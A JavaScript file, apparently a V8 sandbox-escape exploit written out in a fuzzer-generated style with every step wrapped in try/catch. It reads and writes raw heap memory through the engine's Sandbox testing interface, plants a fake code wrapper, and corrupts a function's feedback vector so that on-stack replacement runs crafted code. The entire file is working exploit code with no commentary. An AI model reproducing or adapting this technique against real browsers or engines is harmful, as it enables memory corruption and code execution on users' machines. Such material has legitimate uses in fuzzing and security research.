try {
    const kHeapObjectTag = 1;
    const kJSObjectElementsOffset = 8;
    const kFixedArrayObjectsOffset = 8;
    const kCodeWrapperMap = 4577;
    const kJSFunctionSharedFunctionInfoOffset = 16;
    const kSharedFunctionInfoTrustedFunctionDataOffset = 4;
    const kJSFunctionFeedbackCellOffset = 24;
    const kFeedbackCellValueOffset = 4;
    const kFeedbackVectorRawFeedbackSlotsOffset = 28;
    const kSmiTagSize = 1;
    const v22 = Sandbox?.MemoryView;
    let v25;
    try { v25 = new v22(0, 4294967296); } catch (e) {}
    let v26;
    try { v26 = new DataView(v25); } catch (e) {}
    let memory = v26;
    function getPtr(a29) {
        let v30;
        try { v30 = Sandbox.getAddressOf(a29); } catch (e) {}
        return v30 + kHeapObjectTag;
    }
    function getObj(a33) {
        let v34;
        try { v34 = Sandbox.getObjectAt(a33); } catch (e) {}
        return v34;
    }
    function getField(a36, a37) {
        const v39 = (a36 + a37) - kHeapObjectTag;
        let v41;
        try { v41 = memory.getUint32(v39, true); } catch (e) {}
        return v41;
    }
    function getField64(a43, a44) {
        const v46 = (a43 + a44) - kHeapObjectTag;
        let v48;
        try { v48 = memory.getBigUint64(v46, true); } catch (e) {}
        return v48;
    }
    function setField(a50, a51, a52) {
        const v54 = (a50 + a51) - kHeapObjectTag;
        try { memory.setUint32(v54, a52, true); } catch (e) {}
    }
    function setField64(a58, a59, a60) {
        const v62 = (a58 + a59) - kHeapObjectTag;
        try { memory.setBigUint64(v62, a60, true); } catch (e) {}
    }
    function gc() {
        try { new ArrayBuffer(2145386496); } catch (e) {}
    }
    function findObject(a70, a71) {
        function match() {
            for (let i74 = 0; i74 < a71?.length; ++i74) {
                const v81 = i74 * 4;
                let v82;
                try { v82 = getField(a70, v81); } catch (e) {}
                if (v82 != a71?.[i74]) {
                    return false;
                }
            }
            return true;
        }
        while ((() => {
                let v87;
                try { v87 = match(); } catch (e) {}
                return !v87;
            })()) {
            a70 += 4;
        }
        return a70;
    }
    const v90 = (a91, a92) => {
        return 555810818 | (a92 << 7);
    };
    let v100;
    try { v100 = Array(256); } catch (e) {}
    let v101;
    try { v101 = v100.fill(0); } catch (e) {}
    let v102;
    try { v102 = v101.map(v90); } catch (e) {}
    let scr_arr = v102;
    let v104;
    try { v104 = getPtr(scr_arr); } catch (e) {}
    let v105;
    try { v105 = getField(v104, kJSObjectElementsOffset); } catch (e) {}
    let pscr = (v105 + kFixedArrayObjectsOffset) + 512;
    const frame_size = 256;
    const v114 = (a115, a116) => {
        return 555810816 + a116;
    };
    let v121;
    try { v121 = Array(83); } catch (e) {}
    let v122;
    try { v122 = v121.fill(0); } catch (e) {}
    let v123;
    try { v123 = v122.map(v114); } catch (e) {}
    const payload = [0,0,...v123,185569424 >> 1];
    const v130 = (a131, a132) => {
        return `let v${a132} = ${payload?.[a132] ?? 0};`;
    };
    let v138;
    try { v138 = Array(frame_size); } catch (e) {}
    let v139;
    try { v139 = v138.fill(0); } catch (e) {}
    let v140;
    try { v140 = v139.map(v130); } catch (e) {}
    let v141;
    try { v141 = v140.join("\n"); } catch (e) {}
    const code_str = v141;
    let v145;
    try { v145 = new Function("p1", code_str); } catch (e) {}
    const fake_osr_tgt = v145;
    let v149;
    try { v149 = new Function("loop", "for (let i = 0; i < loop; i++);"); } catch (e) {}
    const osr_func = v149;
    for (let i152 = 0; i152 < 4096; i152++) {
        try { fake_osr_tgt(); } catch (e) {}
    }
    let v159;
    try { v159 = getPtr(fake_osr_tgt); } catch (e) {}
    let ptgt_fn = v159;
    let v161;
    try { v161 = getField(ptgt_fn, kJSFunctionSharedFunctionInfoOffset); } catch (e) {}
    let ptgt_sfi = v161;
    let v163;
    try { v163 = getField(ptgt_sfi, kSharedFunctionInfoTrustedFunctionDataOffset); } catch (e) {}
    let htgt_code = v163;
    try { osr_func(16); } catch (e) {}
    let pfake_wrapper_strong = pscr;
    try { setField(pfake_wrapper_strong, 0, kCodeWrapperMap); } catch (e) {}
    try { setField(pfake_wrapper_strong, 4, htgt_code); } catch (e) {}
    let v172;
    try { v172 = getPtr(osr_func); } catch (e) {}
    let pfn = v172;
    let v174;
    try { v174 = getField(pfn, kJSFunctionFeedbackCellOffset); } catch (e) {}
    let pfbc = v174;
    let v176;
    try { v176 = getField(pfbc, kFeedbackCellValueOffset); } catch (e) {}
    let pfbv = v176;
    const v181 = kFeedbackVectorRawFeedbackSlotsOffset + (4 * 2);
    const v183 = pfake_wrapper_strong | 2;
    try { setField(pfbv, v181, v183); } catch (e) {}
    try { readline(); } catch (e) {}
    try { osr_func(65536); } catch (e) {}
} catch(e189) {
}
